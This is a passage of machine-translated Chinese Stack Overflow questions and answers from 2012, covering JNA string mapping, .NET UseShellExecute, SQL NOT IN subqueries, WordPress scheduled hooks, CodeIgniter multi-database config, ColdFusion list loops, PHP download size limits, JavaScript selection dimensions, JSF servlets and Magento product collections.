        // additionally return a list of starting addresses through the
        // 'strings' parameter (that is 'strings' point into 'buf').
        // 'stringCount' holds the initial array size of 'strings' and will
        // return the count of returned strings.
        TestCaseDLL.INSTANCE.c_getStrings(buf, buf.length, strings, stringCount);

        System.out.println(strings.getPointer(0).getString(0));
        System.out.printf("%c\n", buf[0]);  // how can this line change 'strings'?
        System.out.println(strings.getPointer(0).getString(0));

        for (byte b: buf) {
            System.out.print((char) b);
        }
        System.out.println("");
        for (byte b: buf) {
            System.out.printf("%#x ", b);
        }
        System.out.println("");
    }
} 
```

输出

```
??llo world!
H
?

Hello world! Hallo Welt! Ciao a tutti!
0x48 0x65 0x6c 0x6c 0x6f 0x20 0x77 0x6f 0x72 0x6c 0x64 0x21 0x0 0x48 0x61 0x6c 0x6c 0x6f 0x20 0x57 0x65 0x6c 0x74 0x21 0x0 0x43 0x69 0x61 0x6f 0x20 0x61 0x20 0x74 0x75 0x74 0x74 0x69 0x21 0x0 ... 
```

我遇到了以下问题：

*   返回的字符串已损坏。它应该返回“Hello World！” 而不是“??llo world!”
*   打印`buf[0]`会更改返回的字符串。我现在知道这里发生了什么，因为我只是在阅读它的价值。

我的类型映射是否损坏或者我缺少一些基本的东西？

**更新**

我现在使用使用

```
void c_getStrings(Memory buf, int bufSize, String[] strings, IntByReference stringCount); 
```

如果我要重做它，我会按照 technomage 的建议将它分成两个功能：

```
void c_fill(char *buf, size_t bufSize);
void c_parseToStringArray(const char *buf, const char *strings[], size_t stringsSize); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T14:57:37.177

先说几个技术点：

*   由于您的第三个参数引用了第一个参数，因此您不能使用原始数组。因为它显式地保存了本地指针，所以使用 NIO 缓冲区会很尴尬。这给你留下了`Memory`. 但是，如果您只需要结果`String`值而不关心指针本身，那么`byte[]`NIO 缓冲区或`Memory`将起作用，前提是第三个参数的类型是`String[]`。
*   您的第三个参数似乎是一个可写的指针数组。您可以使用`Pointer[]`或`String[]`。您也可以使用`Memory`，前提是它的分配空间足够大，可以容纳尽可能多的指针值。

然后是更大的问题：

*   为什么你需要一个缓冲区（可能带有嵌入的 NUL 字符）和指向该缓冲区的单个指针？
*   当从 JNA 映射时，这看起来很傻，因为 JNA 会进行自己的字符串分配。`String[]`如果您只是将内存缓冲区作为池字符串存储提供，那么一旦从第三个参数获取字符串，您就不需要它。如果您打算操作缓冲区中的内容，则此类更改不会反映在“返回”字符串中。

# c# - ProcessStartInfo.UseShellExecute 有什么大不了的？

> ID：12603377
> 
> 赞同：5
> 
> 时间：2012-09-26T13:55:22.037
> 
> 标签：c#, .net, windows, shell, process

ProcessStartInfo.UseShellExecute 将如何影响我正在运行的进程？

我是否需要 UAC 的特殊权限才能使用 UseShellExecute？

它会在不同的用户上运行吗？

它会给我新的权限吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-26T14:51:15.723

Windows 有两个不同的 api 函数来启动进程。底层是 CreateProcess()，它直接映射到原生 api 函数。还有ShellExecuteEx()，一个由shell（Explorer）实现的函数。它具有更高级别的抽象。

它们是非常不同的功能，这就是您在 ProcessStartInfo 的文档中看到的内容。CreateProcess() 只能启动可执行文件，但它对控制控制台模式程序有很好的支持，包括重定向 I/O 和控制控制台窗口外观的能力。ShellExecuteEx() 利用了 shell 添加的功能，文件关联是最大的功能，因此您可以启动为特定文件扩展名注册的可执行文件。

两个 api 函数都有影响进程执行方式的选项。您将看到 ProcessStartInfo 类的属性和CreateProcess 支持的[Process Creation Flags](http://msdn.microsoft.com/en-us/library/windows/desktop/ms684863%28v=vs.85%29.aspx)以及ShellExecuteEx() 使用的[SHELLEXECUTEINFO 结构中的字段之间的密切相关性。](http://msdn.microsoft.com/en-us/library/windows/desktop/bb759784%28v=vs.85%29.aspx)但是这些功能不会重叠，因此您需要修改 UseShellExecute。

# sql - 使用 NOT IN 提取数据

> ID：12603378
> 
> 赞同：2
> 
> 时间：2012-09-26T13:55:23.650
> 
> 标签：sql

我是 sql 新手，遇到了一个小问题。我有一个这样的查询：

```
select cust_id, count(1) from all_customers
group by cust_id
having count(1)>4; 
```

该查询给了我想要的结果。

我需要对`all_customers`表中的所有客户进行新查询，并排除我刚刚从上面的查询中得到的结果。我试着做这样的事情：

```
select * from all_customers
where cust_id NOT IN 
(
    select cust_id, count(1) from all_customers
    group by cust_id
    having count(1)>4
) 
```

但我收到错误消息`too many values`。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-26T13:57:35.660

您应该摆脱子句中的*聚合*列。`NOT IN`原因是您只比较`cust_id`列。另请注意，使用 时`NOT IN`，子查询应始终返回单列。

```
select * 
from all_customers
where cust_id NOT IN 
      (
         select cust_id 
         from all_customers
         group by cust_id
         having count(1)>4
      ) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-26T13:58:24.990

子查询中有很多列，请尝试：

```
select * from all_customers
where cust_id NOT IN 
(select cust_id
 from all_customers
 group by cust_id
 having count(1)>4) 
```

# drupal - 导入内容类型后 drupal-6 管理页面消失

> ID：12603382
> 
> 赞同：0
> 
> 时间：2012-09-26T13:55:32.690
> 
> 标签：drupal, drupal-6

导入 cck 定义后，页面超时，此后有几个页面我无法访问，也没有显示在导航中，例如：

*   管理/构建/模块
*   管理员/用户/用户
*   管理员/用户/权限
*   管理员/设置/站点信息
*   管理员/内容/类型/导入

以前有人经历过吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T15:01:00.003

请尝试按以下方式更新您的网站

www.yoursitename.com/update.php

也许它会帮助你。

# wordpress - Wordpress：安排多个相同名称和时间的动作挂钩

> ID：12603384
> 
> 赞同：5
> 
> 时间：2012-09-26T13:55:38.763
> 
> 标签：wordpress, events, action, hook

我目前正在尝试调用我在同一时间内多次创建的动作挂钩。我这样做的原因是我在动作挂钩中使用的函数需要为每个用户运行，用户 ID 作为函数的参数传入。我还需要提前安排这个，因此我使用动作挂钩来安排这个功能提前为每个用户运行。需要调用此函数的速率也取决于用户，因此我无法设置运行它的时间表。

所以总结一下：

我需要安排一个名称相同但参数不同的动作挂钩。根据 WordPress 指南，`wp_schedule_single_event`只要 $arg 不同，就应该能够做到这一点。但是，无论我输入多少不同的 $arg 值，只有创建的第一个被接受，其余的被忽略。

这是我设计的按钮中的代码。我正在使用两个虚拟数组来尝试同时运行 2 个不同的 Action 挂钩实例，但使用不同的参数（根据指南应该可以工作，但不能）。

```
$action_name = 'Hum'.'8';
                    $action_name2 = 'Hum'.'4';

                    $event_array = array('8',$action_name);
                    $event_array2 = array('4',$action_name2);

                    wp_schedule_single_event($timed4, 'Hope', $event_array);
                    wp_schedule_single_event($timed4, 'Hope', $event_array2); 
```

另一个非常接近的尝试是我在互联网上发现的以下功能，有人试图产生相同的结果：

```
function uni($ID,$time) {
//This should be able to create a unique action name.
$action_name = 'Hum'.' '.$ID;

$event_array = array($ID,$action_name);
add_action($action_name,'testing');
wp_schedule_single_event($time, $action_name, $event_array);
} 
```

我把这个函数放在我的主题的functions.php中，它能够通过创建唯一的名称来有效地分配两个不同的动作钩子。这种方法的问题在于，由于某种原因，计划的事件表明值的动作钩子`$action_name`不存在。即使我之前添加了 1 行 :. 我对此的想法是函数内 add_action 的范围不是全局的，因此函数无法获得`wp_schedule_single_event`？

我不需要为每个用户创建的 action_hook 的名称都相同，只要我能够`"testing"`从创建的操作挂钩中运行该函数即可。我只需要使用其中一种方法来实现我的设计。谢谢你。

# php - 两个项目共享相同的用户帐户

> ID：12603385
> 
> 赞同：0
> 
> 时间：2012-09-26T13:55:41.573
> 
> 标签：php, mysql, codeigniter, session, cookies

我有两个独立的项目/站点，每个项目/站点都有自己的数据库。我想在两者之间进行共同的用户注册。我应该为用户帐户创建第三个数据库吗？

我应该如何实现这个？我正在使用 PHP Code Igniter（查看 Ion Auth），这也是另一个问题，因为必须在 php 配置文件中设置数据库配置，我将如何在两者之间交替。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T14:00:46.417

[http://codeigniter.com/user_guide/database/connecting.html](http://codeigniter.com/user_guide/database/connecting.html)

在代码中：

应用程序/配置/数据库.php：

```
$db["default"]["hostname"] = "localhost";
$db["default"]["username"] = "username";
$db["default"]["password"] = "password";
$db["default"]["database"] = "database";

$db["userdatabase"]["hostname"] = "localhost";
$db["userdatabase"]["username"] = "username";
$db["userdatabase"]["password"] = "password";
$db["userdatabase"]["database"] = "database"; 
```

在您的模型中：

```
$this->load->database('userdatabase');
// Do user stuff
$this->load->database('default'); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-26T14:18:34.597

创建第三个数据库（可能）会让你一团糟。两者都必须“远程”连接，当两者都想同时更新同一条记录时，你会怎么做。易于管理，但如果您将一个作为主控，另一个作为从属，则会更简单。

你有三个选择：

1) 始终针对“主”数据库进行身份验证 - 因此，即使您主要使用“数据库从属”，您也会跳到“数据库主”进行身份验证/注册/密码更改等，然后恢复为“从属”其他操作。当它们发生时，您需要将“主”上的用户和会话表的更改复制到“从”中，但这相当小，可以内置到您的模型中。这是我最常用的模型，也可以通过一些玩耍来跳跃域/服务器。

2) 始终针对本地数据库进行身份验证，并将更改从其中一个复制到另一个。虽然它有效，但您可能会因为不确定哪个是最新的而使会话表保持活动状态而陷入混乱。

3）恢复到“Master”和“Slave”选项，您可以设置联合表（http://dev.mysql.com/doc/refman/5.0/en/federated-storage-engine.html）。联合故事支持“更新”，因此当您更新“从属”时，您实际上是在更新主控。但是除非您的数据库在同一台服务器上，并且考虑到您的会话表（假设您正在执行无状态/数据库处理的会话）将在每次调用时访问并经常更新，否则我会避免使用此选项。不过，只是说这是一种选择。

# javascript - 使用 JavaScript 或其他“工具”禁用本机 PrintDialog 的选项有哪些

> ID：12603389
> 
> 赞同：0
> 
> 时间：2012-09-26T13:55:46.987
> 
> 标签：javascript, flash

我需要知道在网站上禁用本机 Firefox 打印对话框的所有选项。

假设 Stack Exchange 不喜欢用户能够通过“文件”>“打印”选项打印[隐私政策](https://stackexchange.com/legal/privacy-policy) 。

因此，应该可以添加禁用此选项的 JavaScript。类似于某些网站用来“禁用”图像右键单击的技术。

这可能吗？

**更多背景：**

我不喜欢这样做。我必须验证我的客户没有在他们的网站（超过 1000 个网站）上做这样丑陋的事情。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T14:05:38.943

JavaScript 绝对不可能访问这些东西 - Print-Dialog 是本机的，不能被禁用。即使有可能，也可以禁用 JavaScript。

一个更好的选择是使用 CSS。大多数浏览器在`print`打印当前页面时都会应用样式表，因此您可以包括以下内容：

```
@media print {
    body { display:none; }
    /* or */
    #box-that-tells-the-reader-there-is-nothing-to-print { display:block; }
    .print-hide-information { visibility:hidden; }
} 
```

当然，可以从 DOM 中删除该 CSS 代码，或者只是截取他的浏览器的屏幕截图等。无论您发送用户查看什么文件，他都可以保存它们 - 您无法阻止。您唯一的可能是为您的编码内容构建一个专有的阅读器/查看器以约束用户（这也可能被黑客入侵），但这在开放网络上是没有选择的。

# ios - 升级到 iOS 6 后出现 NSInternalInconsistencyException

> ID：12603390
> 
> 赞同：1
> 
> 时间：2012-09-26T13:55:55.283
> 
> 标签：ios, uitableview, crash

我们仅从 iOS 6 上的设备收到大量崩溃日志，但有例外

```
Exception   : request for rect at invalid index path ( 2 indexes [0, 0]) (NSInternalInconsistencyException)

....
3   CoreFoundation                      0x34d5857f  + 614
4   libobjc.A.dylib                     0x33068a65  + 128
5   libc++abi.dylib                     0x31eb207b  + 78
6   libc++abi.dylib                     0x31eb2114  + 19
7   libc++abi.dylib                     0x31eb3599 __cxa_current_exception_type + 0
8   libobjc.A.dylib                     0x330689d1 objc_exception_rethrow + 12
9   CoreFoundation                      0x34c9ef21 CFRunLoopRunSpecific + 456
10  CoreFoundation                      0x34c9ed49 CFRunLoopRunInMode + 104
11  GraphicsServices                    0x351db2eb GSEventRunModal + 74
12  UIKit                               0x3607d301 UIApplicationMain + 1120 
```

应用程序不会显式调用 rectForRowAtIndexPath: 方法。请帮忙找原因。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-15T16:57:45.447

当您在空的 UIPickerView 段中选择（触摸）行时，会出现此异常。它仅在 iOS 6 下发生。

# list - ListGetAt 函数返回类型转换错误

> ID：12603392
> 
> 赞同：1
> 
> 时间：2012-09-26T13:55:58.123
> 
> 标签：list, coldfusion

我有以下代码：

```
<cfif SideSell neq "">
    <cftry>
        <cfif listlen(SideSell, ",") gt 0>
            <cfset sidesellvalid = true>
            <cfelse>
            <cfset sidesellvalid = false>
        </cfif>
        <cfcatch type="any">
            <cfset sidesellvalid = false>
        </cfcatch>
    </cftry>
    <cfif sidesellvalid>
        <cfset AddPartNumber = "">
        <cfset AddDescription = "">
        <cfset AddQuantity = "">
        <cfset AddPrice = "">
        <cfset OptionPrice = "">
        <cfset AddItem = "">
        <cfloop list="FORM.SideSell" index="SideSellListIndex" delimiters=",">
            <cfquery name="qSideSellParts" datasource="Pascal">
                SELECT * from Part WHERE PartNumber = <cfqueryparam cfsqltype="cf_sql_varchar" list="yes" separator="," maxlength="45" value="#ListGetAt(SideSell, SideSellListIndex, ',')#">
            </cfquery>
            <cfset AddPartNumber = "#qSideSellParts.PartNumber#">
            <cfset AddDescription = "#qSideSellParts.SubCategory#">
            <cfset AddQuantity = "1">
            <cfset AddPrice = "#qSideSellParts.PartPrice1#">
            <cfset OptionPrice = "0">
            <cfset AddItem = "Add To Cart">

            <cfinclude template="checkpart.cfm">
        </cfloop>
    </cfif>
</cfif> 
```

但是，CF 抛出了一个类型转换异常，说

> “FORM.SideSell 的值不能转换为数字。”

在 SQL 行：

```
SELECT * from Part WHERE PartNumber = <cfqueryparam cfsqltype="cf_sql_varchar" list="yes" separator="," maxlength="45" value="#ListGetAt(SideSell, SideSellListIndex, ',')#"> 
```

我尝试过的测试数据包括“PTI 19-1”和“PTI 19-1,PTI 19-2”，因此无论列表项数如何，问题都存在。我只是缺少或滥用引号吗？

编辑：在我的测试服务器上运行 CF9，在生产服务器上运行 CF8。我使用`<cfdump>`标签来验证数据是否符合我的预期，并且确实如此。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-26T14:18:43.700

您误解了 cfloop 如何与 list 属性一起使用 - 您不需要 ListGetAt 因为该值包含在索引中。

（从技术上讲，这并不准确 - 应该是`item`因为这就是你得到的，但最初实现 cfloop 的人是这样做的，我们一直坚持下去。）

另请注意，列表必须是一个字符串 - 而不是变量名 - 所以您需要散列来将变量评估为一个。

最后，由于您一次遍历列表一项，因此*不应*使用 cfqueryparam 的 list 属性 - （这是用于当您进行`WHERE PartNumber IN (x,y,z)`样式查询并希望将参数视为多个值时。）

总之，你的循环应该是这样的。

```
<cfloop list=#Form.SideSell# index="PartNumber">
    <cfquery name="qSideSellParts" datasource="Pascal">
        SELECT * from Part
        WHERE PartNumber = <cfqueryparam cfsqltype="cf_sql_varchar" value="#PartNumber#">
    </cfquery>
    ...
</cfloop> 
```

（如果您不明白为什么，请添加评论，我会尝试进一步解释。）

# c# - 使用原生 Facebook 应用发帖

> ID：12603394
> 
> 赞同：1
> 
> 时间：2012-09-26T13:56:03.753
> 
> 标签：c#, facebook, windows-phone-7, installed-applications

我是 WP7 开发的新手，但在寻找一种在 Facebook 上发布内容的方法时，我发现只有基于 Browser 对象的外部框架用于身份验证或 ShareLink \ Shared Status 任务。是否可以直接使用\post 安装在手机上的原始 Facebook 应用程序在 FB 上发布（如 iPhone 所做的那样）？

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-26T14:00:11.097

正如您正确提到的，分享到 facebook 的唯一可能方式是来自应用程序中实现的任何外部框架，如[C# SDK](http://csharpsdk.org/)或 ShareLinkTask 或 ShareStatusTasks。

很遗憾，您无法在 Windows 手机设备中访问 Facebook 应用程序。

# php - PHP copy() - 设置文件大小限制？

> ID：12603395
> 
> 赞同：1
> 
> 时间：2012-09-26T13:56:03.583
> 
> 标签：php, file, copy

我正在使用一个脚本，我使用 PHP 函数`copy()`将图像从 URL 保存到我的服务器：`copy('http://si.com/guitar.jpg', 'guitar1213.jpg')`

我想知道是否有任何方法可以在调用此函数时简单地设置最大文件大小限制？或者真的是`.htaccess`我快速解决这个问题的唯一选择吗？

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T14:03:10.990

```
$limit = 1024; //1KB
$fr = fopen($filePath, 'r');
$limitedContent = fread($fr, $limit);
$fw = fopen($filePath, 'w');
fwrite($fw, $limitedContent); 
```

[检查 PHP API](http://cz2.php.net/manual/en/function.fwrite.php)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-26T14:00:51.957

一旦文件在您的服务器上，您只能获取文件大小，我建议将文件下载到临时文件夹，然后您可以轻松检查文件大小并在符合要求的情况下移动到正确的位置。

```
$original_path = 'http://si.com/guitar.jpg';
$temp_location = 'guitar1213.jpg';

$handle = fopen($temp_location, "w+"); 
fwrite($handle, file_get_contents($original_path)); 
fclose($handle); 

if (filesize($temp_location) < 1024000){
  rename($temp_location, 'xxx');
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-26T14:22:04.850

玩弄了先找到文件大小然后执行复制的想法：

```
<?php

if (false !== ($f = fopen($url, 'rb'))) {
    // read the meta data from the file, which contains the response headers
    $d = stream_get_meta_data($f);
    // find the Content-Length header
    if ($headers = preg_grep('/^Content-Length: /i', $d['wrapper_data'])) {
        $size = substr(end($headers), 16);
        // if the size is okay, open the destination stream
        if ($size <= 10000 && false !== ($o = fopen('destination.jpg', 'wb'))) {
            // and perform the copy
            stream_copy_to_stream($f, $o);
            fclose($o);
        }
    }
    fclose($f);
} 
```

**警告**

如果服务器不返回`Content-Length`标头，它将不起作用；这是一种可能需要处理的可能性。

# javascript - 计算所选文本的宽度和高度（javascript）

> ID：12603397
> 
> 赞同：12
> 
> 时间：2012-09-26T13:56:10.777
> 
> 标签：javascript

我需要使用 JavaScript 计算所选/突出显示的文本的`width`和。`height`

我使用 Tim Down 编写的以下代码作为起点，

```
function getSelectionCoords() {
    var sel = document.selection, range;
    var x = 0, y = 0;
    if (sel) {
        if (sel.type != "Control") {
            range = sel.createRange();
            range.collapse(true);
            x = range.boundingLeft;
            y = range.boundingTop;
        }
    } else if (window.getSelection) {
        sel = window.getSelection();
        if (sel.rangeCount) {
            range = sel.getRangeAt(0).cloneRange();
            if (range.getClientRects) {
                range.collapse(true);
                var rect = range.getClientRects()[0];
                x = rect.left;
                y = rect.top;
            }
        }
    }
    return { x: x, y: y };
} 
```

`left`&`top`坐标显示正确。要计算宽度和高度，我还需要`right`&`bottom`位置。

所以我添加了几行代码来找到`bottom`& 的`right`位置（代码在这里 - [http://jsfiddle.net/pankajparashar/kv2Bp/](http://jsfiddle.net/pankajparashar/kv2Bp/)）。但令我惊讶的是，代码显示的`left`坐标`right`总是相同的，即使它们之间存在明显的差异（仅在 Firefox 中测试）。

`top`&位置没有问题`bottom`，因为它们工作得很好，这将帮助我计算高度。但是要计算宽度，我仍然需要正确`right`的坐标。

任何人都可以指出代码的任何缺陷吗？或任何替代方法，使用它我可以计算所选文本的宽度和高度？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-09-26T14:18:20.210

下面是一些代码来获取选择的边界矩形的尺寸。它与原始代码非常相似。

演示：http: [//jsfiddle.net/UFkjy/](http://jsfiddle.net/UFkjy/)

```
function getSelectionDimensions() {
    var sel = document.selection, range;
    var width = 0, height = 0;
    if (sel) {
        if (sel.type != "Control") {
            range = sel.createRange();
            width = range.boundingWidth;
            height = range.boundingHeight;
        }
    } else if (window.getSelection) {
        sel = window.getSelection();
        if (sel.rangeCount) {
            range = sel.getRangeAt(0).cloneRange();
            if (range.getBoundingClientRect) {
                var rect = range.getBoundingClientRect();
                width = rect.right - rect.left;
                height = rect.bottom - rect.top;
            }
        }
    }
    return { width: width , height: height };
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-26T14:01:32.147

尝试使用*range.getBoundingClientRect*而不是*range.getClientRects*。

[JSFiddle](http://jsfiddle.net/kv2Bp/4/)

# ajax - 在两个应用程序 JSF 之间发送 JSON

> ID：12603398
> 
> 赞同：0
> 
> 时间：2012-09-26T13:56:12.630
> 
> 标签：ajax, json, jsf, servlets, xmlhttprequest

我想使用 JSON 和 Ajax 在两个应用程序之间发送数据。对于第一个测试，我想单击一个按钮（在 xhtml 中）并在 managedbean 中接收数据（在第二个应用程序中）。

为此，我创建了：

xhtml页面：

```
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:ui="http://java.sun.com/jsf/facelets" xmlns:h="http://java.sun.com/jsf/html" xmlns:f="http://java.sun.com/jsf/core" xmlns:p="http://primefaces.org/ui">
    <body>
        <ui:composition template="/templates/template.xhtml">
            <ui:define name="content">
                <h:outputScript library="js" name="test.js" />
                <h:form>
                <h:button  onclick="validate();" value="Tester" type="button"/> 
                </h:form>
            </ui:define>
        </ui:composition>
    </body>
    </html> 
```

测试.js：

```
function validate(){ 
    try{
        var myJSONObject = {"name":"hello","address":"xyz"};
        var toServer = "data=" + encodeURIComponent(myJSONObject);
        var request=new XMLHttpRequest();
        request.open("POST", "http://'xxLocalIPxx':8080/Project1/folderTest/TestBean", true);
        request.send(toServer);
        return true;
    }
    catch(err)
    {
    alert(err.message);
    }
}; 
```

托管豆测试豆：

```
public class TestBean extends HttpServlet{
    private static final long   serialVersionUID    = 1L;

    public TestBean() {
        super();
    }

    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        // PrintWriter out = response.getWriter();
        String output = request.getParameter("params");
        System.out.println("Servlet : " + output);
    }
} 
```

但是，当我单击 xhtml 页面中的按钮时，我没有执行 managedBean 中的方法 doGet。我试图在这个方法中设置一个断点，但它从来没有用过。

为什么 ？

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-26T15:22:20.190

您正在混合[servlet](https://stackoverflow.com/tags/servlets/info)和[JSF backing beans](https://stackoverflow.com/tags/jsf/info)。他们彼此**没有任何**关系。您所拥有的`TestBean`类本质上是一个 servlet，而不是一个 JSF 支持 bean。您不能通过`@ManagedBean`在类上或`<managed-bean>`在`faces-config.xml`. 它必须注册为一个完全有价值的 servlet。您可以为此使用`@WebServlet`类上的注释或`<servlet>`条目`web.xml`。

假设您的环境支持 Servlet 3.0，只需使用`@WebServlet`注册它：

```
@WebServlet("/testservlet")
public class TestServlet extends HttpServlet {
    // ...
} 
```

*（这里 ,`/testservlet`是 servlet 必须监听的 URL 模式）*

并且，假设这`/Project1`是上下文路径，将其调用为

> [http://example.com:8080/Project1/testservlet](http://example.com:8080/Project1/testservlet)

*（如果你先在浏览器的地址栏中直接输入 URL 来测试它会更容易）*

### 也可以看看：

*   [如何使用 Servlet 和 Ajax？](https://stackoverflow.com/questions/4112686/how-to-use-servlets-and-ajax/4113258#4113258)

# php - 无法从 Magento 产品集合中获取产品名称

> ID：12603406
> 
> 赞同：0
> 
> 时间：2012-09-26T13:56:28.763
> 
> 标签：php, magento, magento-1.7

`product collection`我只是想从in 中检索产品名称以及其他基本信息，`Magento`但只是得到错误或返回 null。这是为了创建我自己的特色产品块。

我正在尝试从主页中执行此操作（专门创建，而不是使用预先构建的 1-column/2-column 等）：

```
app\design\frontend\default\eyt2012\template\page\homepage.phtml 
```

在我的主页中，我正在像这样加载集合

```
$category = new Mage_Catalog_Model_Category();
$category->load(236);
$_productCollection = $category->getProductCollection(); 
```

然后我借用`<ul>`from中的代码`list.phtml`，我知道它是有效的：

```
app\design\frontend\default\eyt2012\template\catalog\product\list.phtml 
```

以带有图像、标题和价格的漂亮网格格式输出集合中的所有产品。

到目前为止，我总共有：

```
<div class="featured-products">
    Products of the week    

    <?php    
        $category = new Mage_Catalog_Model_Category();
        $category->load(236);
        $_productCollection = $category->getProductCollection();    
    ?>   

        <ul class="products-grid">    

            <?php $_collectionSize = $_productCollection->count() ?>
            <?php $_columnCount = 5 ?>
            <?php 
                $i=0; foreach ($_productCollection as $_product): 
                $i++;
            ?>

                    <li class="item<?php if(($i-1)%$_columnCount==0): ?> first<?php elseif($i%$_columnCount==0): ?> last<?php endif; ?>">

                        1

                        <a 
                        href="<?php echo $_product->getProductUrl() ?>" 
                        title="<?php echo $this->stripTags($this->getImageLabel($_product, 'small_image'), null, true) ?>" 
                        class="product-image">
                            <span class="placeholder"></span>
                            <img src="<?php echo $this->helper('catalog/image')->init($_product, 'small_image')->resize(155); ?>" alt="<?php echo $this->stripTags($this->getImageLabel($_product, 'small_image'), null, true) ?>" />
                        </a>

                        2

                        <?php if ($_product->getbrands()):?>
                            <span class="brandname"><?php echo $_product->getAttributeText('brands') ?></span>
                        <?php endif;?>

                        3  ! Code currently gets to here before error occurs

                        <h2 class="product-name"><a href="<?php echo $_product->getProductUrl() ?>" title="<?php echo $this->stripTags($_product->getName(), null, true) ?>"><?php echo $_helper->productAttribute($_product, $_product->getName(), 'name') ?></a></h2>

                        4
                        <?php echo $this->getPriceHtml($_product, true) ?>

                        5

                        <div class="actions">

                            <?php if($_product->isSaleable()): ?>

                                <button type="button" title="<?php echo $this->__('Add to Cart') ?>" class="button btn-cart" onclick="setLocation('<?php echo $this->getAddToCartUrl($_product) ?>')"><span><span><?php echo $this->__('Add to Cart') ?></span></span></button>

                            <?php else: ?>

                                <p class="availability out-of-stock"><span><?php echo $this->__('Out of stock') ?></span></p>

                            <?php endif; ?>

                        </div>

                    </li>

                <?php endforeach ?>

            </ul>

</div> 
```

这基本上只是 list.phtml 中的代码，除了使用我自己的产品集合。

我在上面代码中的每个功能块之后都放了数字，以测试导致错误的原因。目前它达到 3 然后停止。

谁能告诉我为什么`$_product->getName()`无法与该街区的其他人一起工作？

任何帮助，将不胜感激。谢谢。

编辑：

$_productCollection 的 var_dump

```
object(Mage_Catalog_Model_Resource_Eav_Mysql4_Product_Collection)[337]
  protected '_flatEnabled' => 
    array (size=1)
      1 => boolean false
  protected '_productWebsiteTable' => string 'catalog_product_website' (length=23)
  protected '_productCategoryTable' => string 'catalog_category_product' (length=24)
  protected '_addUrlRewrite' => boolean false
  protected '_urlRewriteCategory' => string '' (length=0)
  protected '_addMinimalPrice' => boolean false
  protected '_addFinalPrice' => boolean false
  protected '_allIdsCache' => null
  protected '_addTaxPercents' => boolean false
  protected '_productLimitationFilters' => 
    array (size=3)
      'category_id' => string '236' (length=3)
      'category_is_anchor' => int 1
      'store_id' => string '1' (length=1)
  protected '_productCountSelect' => null
  protected '_isWebsiteFilter' => boolean false
  protected '_priceDataFieldFilters' => 
    array (size=0)
      empty
  protected '_map' => 
    array (size=1)
      'fields' => 
        array (size=6)
          'price' => string 'price_index.price' (length=17)
          'final_price' => string 'price_index.final_price' (length=23)
          'min_price' => string 'price_index.min_price' (length=21)
          'max_price' => string 'price_index.max_price' (length=21)
          'tier_price' => string 'price_index.tier_price' (length=22)
          'special_price' => string 'price_index.special_price' (length=25)
  protected '_storeId' => string '1' (length=1)
  protected '_itemsById' => 
    array (size=0)
      empty
  protected '_staticFields' => 
    array (size=6)
      'entity_id' => string 'entity_id' (length=9)
      'entity_type_id' => string 'entity_type_id' (length=14)
      'attribute_set_id' => string 'attribute_set_id' (length=16)
      'type_id' => string 'type_id' (length=7)
      'created_at' => string 'created_at' (length=10)
      'updated_at' => string 'updated_at' (length=10)
  protected '_entity' => 
    object(Mage_Catalog_Model_Resource_Eav_Mysql4_Product)[165]
      protected '_productWebsiteTable' => string 'catalog_product_website' (length=23)
      protected '_productCategoryTable' => string 'catalog_category_product' (length=24)
      protected '_attributes' => 
        array (size=0)
          empty
      protected '_read' => 
        object(Varien_Db_Adapter_Pdo_Mysql)[90]
          protected '_transactionLevel' => int 0
          protected '_connectionFlagsSet' => boolean true
          protected '_ddlCache' => 
            array (size=1)
              ...
          protected '_bindParams' => 
            array (size=2)
              ...
          protected '_bindIncrement' => int 2
          protected '_debug' => boolean false
          protected '_logQueryTime' => float 0.05
          protected '_logAllQueries' => boolean false
          protected '_logCallStack' => boolean false
          protected '_debugFile' => string 'var/debug/sql.txt' (length=17)
          protected '_debugIoAdapter' => null
          protected '_debugTimer' => int 0
          protected '_cacheAdapter' => 
            object(Varien_Cache_Core)[13]
              ...
          protected '_isDdlCacheAllowed' => boolean true
          protected '_pdoType' => string 'mysql' (length=5)
          protected '_numericDataTypes' => 
            array (size=16)
              ...
          protected '_defaultStmtClass' => string 'Zend_Db_Statement_Pdo' (length=21)
          protected '_config' => 
            array (size=12)
              ...
          protected '_fetchMode' => int 2
          protected '_profiler' => 
            object(Zend_Db_Profiler)[20]
              ...
          protected '_defaultProfilerClass' => string 'Zend_Db_Profiler' (length=16)
          protected '_connection' => 
            object(PDO)[17]
              ...
          protected '_caseFolding' => int 0
          protected '_autoQuoteIdentifiers' => boolean true
          protected '_allowSerialization' => boolean true
          protected '_autoReconnectOnUnserialize' => boolean false
      protected '_write' => string 'catalog_write' (length=13)
      protected '_type' => 
        object(Mage_Eav_Model_Entity_Type)[123]
          protected '_attributes' => null
          protected '_attributesBySet' => 
            array (size=0)
              ...
          protected '_sets' => null
          protected '_eventPrefix' => string 'core_abstract' (length=13)
          protected '_eventObject' => string 'object' (length=6)
          protected '_resourceName' => string 'eav/entity_type' (length=15)
          protected '_resource' => null
          protected '_resourceCollectionName' => string 'eav/entity_type_collection' (length=26)
          protected '_cacheTag' => boolean false
          protected '_dataSaveAllowed' => boolean true
          protected '_isObjectNew' => null
          protected '_data' => 
            array (size=16)
              ...
          protected '_hasDataChanges' => boolean true
          protected '_origData' => null
          protected '_idFieldName' => string 'entity_type_id' (length=14)
          protected '_isDeleted' => boolean false
      protected '_attributesById' => 
